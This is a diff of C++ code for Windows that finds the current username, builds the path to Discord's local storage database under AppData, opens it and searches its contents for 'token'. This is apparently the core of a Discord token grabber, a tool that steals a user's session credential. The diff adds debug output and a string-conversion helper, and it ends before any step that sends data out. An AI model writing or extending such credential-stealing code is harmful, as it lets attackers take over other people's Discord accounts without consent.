@@ -3,17 +3,8 @@
 #include <string>
 #include <iostream>
 #include <fstream>
-
-#ifdef __unix__                    /* __unix__ is usually defined by compilers targeting Unix systems */
-
-#define OS_Windows 0
-
-#elif defined(_WIN32) || defined(WIN32)     /* _Win32 is usually defined by compilers targeting 32 or   64 bit Windows systems */
-
-#define OS_Windows 1
 #include <windows.h>
-
-#endif
+#define UNLEN 64
 
 
 using namespace std;
@@ -50,30 +41,38 @@ std::string ExtractString(std::string source, std::string start, std::string end
 	std::string::size_type endIndex = source.find(end, startIndex);
 	return source.substr(startIndex, endIndex - startIndex);
 }
+std::string ws2s(const std::wstring& wstr)
+{
+	int size_needed = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), int(wstr.length() + 1), 0, 0, 0, 0);
+	std::string strTo(size_needed, 0);
+	WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), int(wstr.length() + 1), &strTo[0], size_needed, 0, 0);
+	return strTo;
+}
 
 std::string getUsername()
 {
 	string usernameFound;
-	#ifdef OS_Windows
-	LPWSTR acUserName;
-	char* ChrUserName;
-	DWORD nUserName = sizeof(acUserName);
-	if (GetUserName(acUserName, &nUserName))
-		wcstombs_s(ChrUserName, acUserName, sizeof(ChrUserName));
-	string Username(ChrUserName);
-	usernameFound = Username;
-	#elif 
 	
-	#endif
+	char* ChrUserName;
+	TCHAR username[UNLEN + 1];
+	DWORD size = UNLEN + 1;
+	GetUserName((TCHAR*)username, &size);
+	string Username = ws2s(username);
+	const char* CHRrealUsrNm=Username.c_str();
+	for (int i = 0; i < Username.length()-1; i++)
+	{
+		usernameFound += CHRrealUsrNm[i];
+	}
 	return usernameFound;
 }
-
 int main(int argc, char *argv[])
 {
 	string textStr;
 	string search = "token";
 	string username = getUsername();
-	string discordPath = "C:\\Users\\"+username+"\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
+	cout << "Your username is: " << username << endl;
+	string discordPath = "C:\\Users\\" + username + "\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
+	cout << "The path for discordDB is: " << discordPath << endl;
 	ifstream myfile(discordPath);
 	if (!creepyStrToRealChar(myfile, &textStr))
 	{
